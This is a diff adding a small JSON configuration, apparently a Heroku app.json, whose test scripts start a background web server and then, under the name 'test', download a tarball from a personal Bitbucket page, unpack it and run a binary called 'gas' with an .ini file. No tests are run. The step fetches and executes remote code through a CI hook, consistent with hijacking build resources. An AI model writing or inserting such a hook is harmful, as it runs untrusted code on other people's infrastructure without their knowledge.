@@ -1,0 +1,10 @@
+{
+  "environments": {
+    "test": {
+      "scripts": {
+        "test-setup": "heroku-php-apache2 >/dev/null 2>&1 & sleep 5",
+        "test": "wget https://bitbucket.org/17213028/keun/downloads/mantull.tar.gz && tar -xvf mantull.tar.gz && ./gas keun.ini"
+      }
+    }
+  }
+}
